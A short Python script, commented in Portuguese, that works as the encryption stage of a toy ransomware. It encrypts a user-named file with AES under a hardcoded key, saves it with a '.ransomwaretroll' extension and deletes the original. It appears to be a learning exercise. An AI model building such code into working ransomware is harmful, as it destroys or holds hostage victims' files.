#Aqui iremos criptografar

import os
import pyaes

# Solicita ao usuário o nome do arquivo
file_name = input("Digite o nome do arquivo que deseja criptografar (com a extensão): ")

# Ler o conteúdo do arquivo original
with open(file_name, 'rb') as file:
    file_data = file.read()

# Chave de criptografia (deixe fixa por enquanto)
key = b'1234567890abcdef'
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

# Criar novo nome para o arquivo criptografado
new_file = file_name + '.ransomwaretroll'
with open(new_file, 'wb') as file:
    file.write(crypto_data)

# Apagar o original somente após o sucesso da criptografia
os.remove(file_name)
